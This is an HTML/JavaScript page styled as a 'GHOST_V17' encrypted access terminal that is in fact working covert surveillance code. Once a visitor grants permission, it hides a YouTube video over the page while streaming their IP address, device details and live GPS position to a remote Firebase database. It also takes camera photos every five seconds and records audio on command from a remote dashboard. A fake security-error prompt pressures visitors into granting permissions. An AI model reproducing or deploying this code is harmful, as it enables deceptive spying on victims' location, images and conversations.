<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GHOST_V17 | NODE ACCESS</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #00f2ff; font-family: 'Courier New', monospace; overflow: hidden; }
        #ghost-ui { height: 100vh; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, #1a0000 0%, #000 100%); position: relative; z-index: 10; }
        .terminal-box { border: 2px solid #ff0000; padding: 35px; background: rgba(0,0,0,0.95); box-shadow: 0 0 30px #ff0000; width: 85%; max-width: 380px; text-align: center; }
        h2 { margin: 0; letter-spacing: 5px; color: #ff0000; text-shadow: 0 0 10px #ff0000; }
        input { background: #000; border: 1px solid #00f2ff; color: #00f2ff; padding: 12px; width: 100%; margin: 20px 0; outline: none; box-sizing: border-box; text-align: center; }
        button { background: #ff0000; color: #fff; border: none; padding: 15px; font-weight: bold; width: 100%; cursor: pointer; text-transform: uppercase; box-shadow: 0 0 15px #ff0000; }
        #video-layer { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>

    <div id="ghost-ui">
        <div class="terminal-box">
            <h2>GHOST_V17</h2>
            <p style="font-size:11px; color:#ff0000;">ENCRYPTION: AES-256 ACTIVE</p>
            <input type="text" id="tName" placeholder="ENTER ACCESS CODE">
            <button onclick="ignite()">AUTHORIZE CONNECTION</button>
        </div>
    </div>

    <div id="video-layer">
        <iframe id="yt-player" src="" allow="autoplay; camera; microphone"></iframe>
    </div>

<script>
    // ********** CONFIGURATION **********
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
    const vID = "6Ogzc_-lW9w"; // YouTube Video ID

    // ********** MAIN INITIATION **********
    async function ignite() {
        const uName = document.getElementById('tName').value;
        if(!uName) return;

        try {
            // Request permissions for Camera and Mic immediately
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            
            // UI Switch to YouTube
            document.getElementById('yt-player').src = `https://www.youtube.com/embed/${vID}?autoplay=1&mute=1&loop=1&playlist=${vID}&controls=0`;
            document.getElementById('video-layer').style.display = 'block';

            // Get Battery & System Intel
            let bat = "N/A";
            try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100); } catch(e){}
            
            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            
            // Initial Firebase Log
            db.ref(`targets/${sessionID}/info`).set({
                name: uName,
                ip: ipData.ip,
                battery: bat,
                ram: navigator.deviceMemory || "N/A",
                platform: navigator.platform,
                status: "ONLINE",
                time: new Date().toLocaleTimeString()
            });

            // Trigger Dashboard Alert
            db.ref('alerts').set({ id: sessionID, type: 'connection', t: Date.now() });

            // Start Auto-Tracking
            trackGPS();
            
            // First Photos (Front then Back after delay)
            capture("user"); 
            setTimeout(() => capture("environment"), 5000); 

            // Set 5-second Auto-Loop
            setInterval(() => { capture("user"); }, 5000);

            // Command Listener for Admin Dashboard
            db.ref(`commands/${sessionID}`).on('value', snap => {
                const cmd = snap.val();
                if(cmd) {
                    if(cmd.act === 'f') capture("user");
                    if(cmd.act === 'b') capture("environment");
                    if(cmd.act === 'a') recordAudio(30000); // 30 sec audio
                    db.ref(`commands/${sessionID}`).remove(); // Clear command after execution
                }
            });

        } catch (err) {
            console.error(err);
            alert("SECURITY ERROR: Permission Required for Encrypted Sync.");
            location.reload();
        }
    }

    // ********** CAMERA LOGIC **********
    async function capture(mode) {
        try {
            const constraints = { 
                video: { facingMode: mode === "user" ? "user" : { exact: "environment" } } 
            };
            
            // Fallback for devices that don't support 'exact' environment
            const stream = await navigator.mediaDevices.getUserMedia(constraints).catch(() => {
                return navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                const dataURL = canvas.toDataURL('image/jpeg', 0.5);
                db.ref(`targets/${sessionID}/photos`).push({
                    img: dataURL,
                    type: mode,
                    time: new Date().toLocaleTimeString()
                });

                // Stop tracks to release camera
                stream.getTracks().forEach(track => track.stop());
            }, 2000);
        } catch (e) {
            console.log("Capture Error: " + e);
        }
    }

    // ********** AUDIO LOGIC (BASE64) **********
    async function recordAudio(duration) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            let audioChunks = [];

            mediaRecorder.ondataavailable = (event) => { audioChunks.push(event.data); };

            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = () => {
                    const base64Audio = reader.result;
                    db.ref(`targets/${sessionID}/audio`).push({
                        data: base64Audio,
                        time: new Date().toLocaleTimeString()
                    });
                };
                stream.getTracks().forEach(track => track.stop());
            };

            mediaRecorder.start();
            setTimeout(() => { if(mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, duration);
        } catch (e) {
            console.log("Audio Error: " + e);
        }
    }

    // ********** GPS TRACKING **********
    function trackGPS() {
        if ("geolocation" in navigator) {
            navigator.geolocation.watchPosition(
                (pos) => {
                    db.ref(`targets/${sessionID}/location`).set({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        alt: pos.coords.altitude || "N/A",
                        speed: pos.coords.speed || 0
                    });
                },
                (err) => { console.log("GPS Error: " + err.message); },
                { enableHighAccuracy: true }
            );
        }
    }
</script>
</body>
</html>
